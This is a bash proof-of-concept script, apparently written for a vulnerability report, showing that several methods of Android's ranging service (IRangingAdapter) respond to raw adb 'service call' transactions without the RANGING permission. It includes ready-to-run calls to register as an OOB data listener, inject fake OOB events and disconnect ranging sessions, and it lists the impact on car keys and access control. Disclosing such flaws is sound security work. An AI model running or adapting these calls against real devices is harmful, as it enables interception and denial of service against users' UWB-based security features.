#!/bin/bash
# V-464 PoC: IRangingAdapter Permissionless Access
# Demonstrates that 7 of 13 methods in the ranging service
# can be called without android.permission.RANGING
#
# Device: Pixel 10, Android 16 (CP1A.260405.005)
# Service: ranging (android.ranging.IRangingAdapter)
# Module: com.android.uwb APEX (service-ranging.jar)

echo "=== V-464: IRangingAdapter Permission Bypass PoC ==="
echo "Device: $(adb shell getprop ro.product.model)"
echo "Build:  $(adb shell getprop ro.build.display.id)"
echo "SPL:    $(adb shell getprop ro.build.version.security_patch)"
echo ""

echo "--- Testing PROTECTED methods (should get permission denial) ---"
echo ""

echo "[TX=1] startRanging (requires RANGING permission):"
adb shell service call ranging 1
echo ""

echo "[TX=4] addOobDevice (requires RANGING permission):"
adb shell service call ranging 4
echo ""

echo "--- Testing UNPROTECTED methods (should succeed without permission) ---"
echo ""

echo "[TX=13] registerOobSendDataListener (NO permission check):"
result=$(adb shell service call ranging 13)
echo "$result"
if echo "$result" | grep -q "00000000"; then
    echo "  >>> SUCCESS — registered OOB data listener WITHOUT RANGING permission!"
else
    echo "  >>> UNEXPECTED — check service availability"
fi
echo ""

echo "[TX=7] registerCapabilitiesCallback (NO permission check):"
result=$(adb shell service call ranging 7)
echo "$result"
if echo "$result" | grep -q "00000000\|invoke interface"; then
    echo "  >>> REACHED IMPL — no permission denial (NPE on null callback is expected)"
else
    echo "  >>> UNEXPECTED"
fi
echo ""

echo "[TX=8] unregisterCapabilitiesCallback (NO permission check):"
result=$(adb shell service call ranging 8)
echo "$result"
echo ""

echo "[TX=9] oobDataReceived (NO permission check — can inject fake OOB data):"
result=$(adb shell service call ranging 9)
echo "$result"
echo ""

echo "[TX=10] deviceOobDisconnected (NO permission check — DoS ranging sessions):"
result=$(adb shell service call ranging 10)
echo "$result"
echo ""

echo "[TX=11] deviceOobReconnected (NO permission check — inject reconnect events):"
result=$(adb shell service call ranging 11)
echo "$result"
echo ""

echo "[TX=12] deviceOobClosed (NO permission check — DoS ranging sessions):"
result=$(adb shell service call ranging 12)
echo "$result"
echo ""

echo "=== Summary ==="
echo "7 of 13 IRangingAdapter methods accessible without RANGING permission."
echo "The RANGING permission is protection level: dangerous (runtime)"
echo "This means user must explicitly grant it — but these 7 methods bypass that."
echo ""
echo "Impact:"
echo "  - Any zero-permission app can enumerate UWB/BLE CS/WiFi RTT capabilities"
echo "  - Any zero-permission app can register as OOB data listener (intercept)"
echo "  - Any zero-permission app can inject fake OOB lifecycle events (DoS)"
echo "  - Affects UWB ranging security (digital car keys, FindMy, access control)"
